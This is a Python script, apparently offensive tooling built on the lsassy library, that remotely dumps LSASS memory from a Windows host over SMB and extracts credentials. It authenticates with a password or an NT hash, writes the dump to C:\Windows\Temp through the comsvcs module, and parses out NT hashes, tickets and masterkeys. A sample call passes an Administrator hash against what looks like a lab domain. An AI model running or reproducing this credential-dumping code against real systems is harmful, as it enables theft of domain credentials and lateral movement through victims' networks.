from lsassy.dumper import Dumper
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile
from lsassy.parser import Parser
import argparse
import logging
import sys

def dump_lsass(args):
    logging.disable(sys.maxsize) # Disable lsassy logger (noisy)
    parser = argparse.ArgumentParser(prog='dump', description='Dump lsass remotely, requires admin privileges.')
    parser.add_argument('-u', '--username', type=str, required=True, help='The username to use.')
    parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
    parser.add_argument('-t', '--target', type=str, required=True, help='The target ip.')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-p', '--password', default='', type=str, help='The password to use.')
    group.add_argument('--nthash', type=str, default='', help='NT hash to be used instead of password.')
    args = parser.parse_args(args.split())

    session = Session()
    session.get_session(
        address=args.target,
        target_ip=args.target,
        port=445,
        username=args.username,
        password=args.password,
        nthash=args.nthash,
        domain=args.domain
    )
    if session.smb_session is None:
        print("Couldn't connect to remote host")
        return None
    
    dumper = Dumper(session, timeout=5, time_between_commands=1).load(dump_module='comsvcs')
    file = dumper.dump(dump_name="sasso.dmp")
    if file is None:
        print("Unable to dump lsass, maybe you don't have admin privileges.")
        return None
    
    file = ImpacketFile(session).open(share="C$", timeout=5, file="sasso.dmp", path="\\Windows\\Temp\\")
    if file is None:
        print("Unable to open lsass dump, might have been removed by host's antivirus.")
        return None
    
    credentials, tickets, masterkeys = Parser(args.target, file).parse()
    file.close()

    result = ImpacketFile.delete(session, file.get_file_path(), timeout=5) # Doesn't work at the moment
    #if result is None:
    #    print("Unable to delete dump from remote system.")

    try:
        dumper.clean()
    except Exception as e:
        print(f"Potential issue when cleaning dumper: {e}")

    try:
        session.smb_session.close()
    except Exception as e:
        print(f"Potential issue when cleaning dumper: {e}")

    unique_creds = []
    for cred in credentials:
        credent = cred.get_object() # Get Credentials object data in dict format
        current_creds = [credent['domain'], credent['username'], credent['nthash']]

        if current_creds not in unique_creds:
            if credent['nthash'] != None:
                #print(f"{credent['domain']}/{credent['username']}:{credent['nthash']}") # Pretty print results
                unique_creds.append([credent['domain'], credent['username'], credent['nthash']])
    
    return unique_creds
    
creds = dump_lsass("--target 192.168.56.133 -u Administrator --nthash 58a478135a93ac3bf058a5ea0e8fdb71 -d contoso.local")
print(creds)